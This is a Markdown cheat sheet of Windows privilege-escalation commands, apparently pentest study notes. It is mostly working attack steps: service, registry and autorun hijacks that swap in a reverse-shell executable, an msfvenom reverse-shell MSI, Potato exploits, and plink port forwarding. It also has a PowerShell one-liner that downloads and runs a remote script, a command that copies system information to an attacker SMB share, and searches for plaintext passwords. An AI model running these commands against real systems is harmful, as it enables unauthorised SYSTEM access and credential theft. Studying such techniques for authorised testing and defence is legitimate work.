## Kernal Exploits
```powershell
## Kernal exploit are very unstable. Should only use as a last resort
## Use Windows Exploit Suggester
https://github.com/bitsadmin/wesng

## Precompiled kernal exploits
https://github.com/SecWiki/windows-kernel-exploits

## Enumerate missing KBs and suggest exploits
https://github.com/rasta-mouse/Watson

## On Victim host, cat sysinfo to txt file
systeminfo > \\0.0.0.0\evilsmbshare\systeminfo.txt

## Run watson against systeminfo.txt
python wes.py /evilshare/systeminfo.txt -i 'Elevation of Privilege' --exploits-only | more

## Find cve exploit, transfer a .exe rev shell to victim and start nc on attacker host
nc -nvlp 8989

## Run compiled binary on victim host to execute revshell
.\cve-8120-x64.exe C:\Users\Public\rev.exe
## Should get SYSTEM on nc listener if done correctly

```

## Service Exploits
```powershell
## Useful service cmds
## Query the config of a service
sc.exe qc <name>
## Query the current status of a service
sc.exe query <name>
##Modify a config option of a service
sc.exe config <name> <option>= <value>
##  Start/stop a service
net start/stop <name>
```

## Service Misconfigurations
### 1. Insecure Misconfig Permissions
```powershell
## If user has permissions to change the config of a service white run with SYSTEM priv, we can change the executable to one of ours.
## If you cannot start/stop the service, you may not work.

## Use can use winpeas to enum services information
.\winpeasany.exe quiet servicesinfo
## Verify winpeas info w/ accesschk Look for service change config,start/stop permissions.
.\accesschk.exe /accepteula -uwcqv user <servicename>
## Query the service to see its config
sc qc <name>
## if u see 'Service_start_name: localsystem' = SYSTEM 
## Stop the service
net stop <servicename>
## Change the services binary path to your reverseshell.exe
sc config <servicename> binpath= "\"C:\User\Public\rev.exe\""
## Start yo' listener on local host
sudo nc -nvlp 8989
## start service 
net start <servicename>
```

### 2. Unquoted Service Path
```powershell
##Executables in Windows can be run w/o using thie extension using their extension (e.g. "whoami.exe" can be exectuable by type just "whoami").
## Some executables take more than 1 argument, separated by spaces. E.g cmd.exe arg1 arg2 arg3.
## This type of buzz leads to ambiguity when using abslute paths that are unquoted and contain spaces.

## Example of unquoted path: C:\Program Files\Clients App\program.exe
## This us, this runs program.exe. To Windows, C:\Program could be the executable with the two arguments "Files\Clients" and "App\program.exe".
## Windows resolves this ambiguity by checking each of the possibilities.
## If u can write to a location Windows check before the actual executable u can trick the service into executing it instead. lol
```

```powershell
## Use winpeas to check or powerup if you have powershell.
.\winpeasany.exe quiet servicesinfo
OR
powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘http://0.0.0.0/PowerUp.ps1’);Invoke-AllChecks”

## verify u have start/stop access
.\accesschk.exe /accepteula -ucqv <service>
## Check write permissions on each directory in the binary PATH
.\accesschk.exe /accepteula -uwdq C:\
.\accesschk.exe /accepteula -uwdq "C:\Program Files"
.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
## Copy ur revshell.exe to on the binary paths you have access to (builtin\users)
copy revshell.exe .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\rev.exe"
## Start nc on local host and then start the service.
```

## 3. Weak Registry Permissions
```powershell
## Windows registry stores entries for each service.
## Since registry entries can have ACLs, if the ACl is misconfigured it could modify a services configuration even if we cannot modify the service directly.

## In winpeas output, you want to check under  the 'Looking if you can modify any service registry' results

powershell -exec bypass

Get-Acl <reg-path-from-winpeas> | Format-List

.\accesschk.exe /accepteula -uvwqk <reg-path-from-winpeas>
##check to see if you can restart service
.\accesschk.exe /accepteula -ucqv -user regsvc

reg query <reg-path-from-winpeas>
## Check imagepath from above cmd. see if object runs as local system. If yes, overwrite the imagepath to your rev shell.
 reg add <reg-path-from-winpeas> /v ImagePath /t REG_EXPAND_SZ /d C:\User\Public\rev.exe /f

## Start your listener and then start the service.
```

## 4. Insecure Service Excutables
```powershell
## If the og service executable is modifiable by our user, we can replace it with our rev shell exe. Create a backup if exploiting in IRL.
## Check Winpeas results for Service Info.
```

## 5. DLL Hijacking
```powershell
## DLL = Dynamic-link library. A service will try to load parts of the program from a library clled DLL files. Whatever functionality the DLL provides will be executed with the same privileges as the service that loaded it. 
## If a DLL is loaded with an absolute path, it might be possible to escalate privileges if that DLL is writable by our user.

## A more common misconfig is when a DLL is missing from the system, and our user has write permissions to a directory within the PATH that windows is searching for the DLL in. This process is very manual.

## If you find a DLL missing PATH, you can use msfvenom to create a rev shell DLL.
```

## Registry Exploits
```powershell
## Windows can be configured to run cmds at startup with elevated privileges. These 'AutoRuns' are config in the Registry.
## Kinda suck cause you have to wait or restart the host yourself.

## Use Winpeas 
.\winPEASany.exe quite applicationsinfo
## Check autorun applications field.

## Enum RegPath manually w/o winpeas
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVerion\Run
## Use accesschk to verify permissions from cmd results of above
.\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
## Make a backup copy 
copy "C:\Program Files\Autorun Program\program.exe" C:\Temp

## Copy and overide your reverseshell.exe with vuln program.
copy /Y rev.exe "C:\Program Files\Autorun Program\program.exe"
## Set up nc listener and restart windows.
```

## 2. AlwaysInstallElevated
```powershell
## MSI (Microsoft Installer) files are package files used to install apps.
## Windows allow for these installers to run with admin priv sometimes. 
## This can only work if the following regs are enabled:
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer

## The "AlwaysInstallElevated" value music be set to 1 for both local machine and current user.

## Winpeas has a "AlwaysInstallElevated" check
.\winPEASany.exe quite windowscreds

## Verify manually. First, current user:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
## Local machine:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

## All ya gotta do is create a reverse msi file.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=0.0.0.0 LPORT=8898 -f msi -o /tools/rev.msi
## transfer rev.msi over and start a listener on your attacking host.
pythom3 -m http.server

Invoke-Webrequest -UseBasicParsing 0.0.0.0:8000/rev.msi -OutFile rev.msi

nc -nvlp 8898

msiexec /quiet /qn /i rev.msi
```

## Passwords
### 1. Registry passwords
```powershell
.\winPEASany.exe quiet filesinfo userinfo
## Confirm results manually, Search registry for plaintext passwords. THis will spit a lot of output
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

winexe -U 'admin%password123' //0.0.0.0 cmd.exe
OR
winexe -U 'admin%password123' --system //0.0.0.0 cmd.exe
```
### 2. Saved Creds
```powershell
.\winPEASany.exe quite cmd windowscreds

## Confirm stored creds found
cmdkey /list

## Create rev shell, transfer it and start listener on local host. Runas cmd to run rev shell as admin saved cred
runas /savedcred /user:admin C:\User\Public\rev.exe
```
### 3. Configuration Files
```powershell
.\winPEASany.exe quiet cmd searchfast filesinfo
## Recursively search for files in the current directory with "pass" in the name, or ending in ".config".
dir /s *pass* == *.config
## Recursively search for files in the current directory with "password" and also end in the specified file types:
findstr /si password *.xml *.ini *.txt

## Not a good idea to run from root directory, could crash the system. better to run these cmds in places you think passwords might be stored
```
### 4. SAM (Security Account Manager)
```powershell

```

## Scheduled Tasks
```powershell
## Windows can be configured to run tasks at specific times or when triggered by a certain event. Tasks usually run with privs of the user who created, but sometimes they're configured to run as admin, or SYSTEM.

## list all sceduled tasks
schtasks /query /fo LIST /v
## Powershell way
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

## Often you'll rely on other clues like finding a script or log file that indicates a scheduled task is being run.

## if you find a file that schedules with priv you like, check to see what permissions you have to the file.
.\accesschk.exe /accepteula -quv user <file.ps1>
## You have write permissions, sick. Set up a listener and make a call in the script to your reverse shell.
rev.exe >> <file.ps1>
```

## Installed Apps
```powershell
## Lots of non standard window applications have priv esc vulns. Search for these apps and use exploit-db to see if there is any priv esc.

## Use tasklist to see installed apps
tasklist /V
## Or use seatbelt.exe (easier)
.\seatbelt.exew NonstandardProcesses
## Or Winpeas (Note, process is spelt wrong in some versions of winpeas. Its spelt like proces for some, process in others)
.\winPEASany.exe quiet procesinfo
## If you find apps, use exploit-db to find exploit. Tick 'Has App' and type priv esc into search bar.
https://www.exploit-db.com/?type=local
```

## Hot Potato
```powershell
## Hot Potato is an attack that uses a spoofing attack along with an NTLM relay attack to gain SYSTEM priv.
## The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using BTLM. The NTLM creds then get relayed to SMB in order to gain cmd exe. This attack works on Windows 7, 8 and early versions of Win 10 and their server counterparts.

## Transfer the binary to victim host and run the following. Dont forget to start a listener on your local host.
.\potato.exe -ip 0.0.0.0 -cmd "C:\Public\rev.exe" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true

## the -enable_httpserver etc etc is for windows 7 machines.
```

## Juicy Potato
```powershell
## An exploit called Rotten Potato was identified in 2016. Service Accounts (SA) could intercept a SYSTEM ticket and use it to impersonate.
## This was possible b/c SAs usually have the "SeImpersonatePrivilege" enabled.
## Rotten Potato is quite limited. Juicy Potato is an updated version with extensive research and more ways to exploit.

## https://github.com/ohpe/juicy-potato

## Check to see if SeImpersonatePrivilege is enabled
whoami /priv

## start nc listener on local host
nc -nvlp 53
## On victim machine
C:\Public\JuicyPotato.exe -l 1337 -p C:\Public\rev.exe -t * -c <cls-id>
```

## Port Forwarding 
```powershell
## Sometimes its easier to run exploit code on kali but the vuln program is listening on an internal port. In these cases we need to forward a port on kali to the internal windows port. We can do this with plink.exe

## Kill smbserver if you have it running on your attacker machine
pkill --full smbserver.py

## Ensure PermitRootLogin is set to yes in
nano /etc/ssh/sshd_config
## Restart SSH service
sudo service ssh restart
## copy plink.exe over to target host and run the cmd:
.\plink.exe root@0.0.0.0 -R 445:127.0.0.1:445
## root@0.0.0.0 = kali ip. -R = tells plink to forward a remote port to local port. The first 445 = port ur forwarding on kali host. 127.0.0.1 = windows local ip. last 445 = port you want forwarded.
```

#### DLL Hijacking
```powershell
ps
search -f Vulnerable.exe
download Vulnerable.exe
https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
```
#### Stored Credentials
```powershell
dir c:\*vnc.ini /s /b /c
dir c:\*ultravnc.ini /s /b /c
dir c:\ /s /b /c | fin dstr /si *vnc.ini
findstr /si password *.txt | *.xml | *.ini
findstr /si pass *.txt | *.xml | *.ini
```
